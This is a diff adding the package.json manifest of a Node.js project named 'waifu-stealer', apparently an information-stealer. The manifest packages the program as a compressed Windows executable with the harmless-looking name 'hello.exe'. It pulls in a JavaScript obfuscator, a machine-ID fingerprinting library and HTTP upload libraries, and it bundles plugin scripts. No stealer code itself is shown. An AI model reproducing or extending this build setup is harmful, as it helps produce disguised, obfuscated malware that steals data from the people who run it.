@@ -1,0 +1,27 @@
+{
+  "name": "waifu-stealer",
+  "private": true,
+  "main": "index.js",
+  "bin": "index.js",
+  "scripts": {
+    "start": "node index.js",
+    "build": "node builder.js",
+    "pkg-windows": "pkg --targets node18-win-x64 --compress GZip --output hello.exe package.json"
+  },
+  "dependencies": {
+    "form-data": "^4.0.0",
+    "is-wsl": "^2.2.0",
+    "node-fetch": "^2.6.7",
+    "node-machine-id": "^1.1.12"
+  },
+  "devDependencies": {
+    "fs-extra": "^10.1.0",
+    "javascript-obfuscator": "^4.0.0"
+  },
+  "workspaces": [
+    "plugins/*"
+  ],
+  "pkg": {
+    "scripts": "plugins/**/lib.js"
+  }
+}
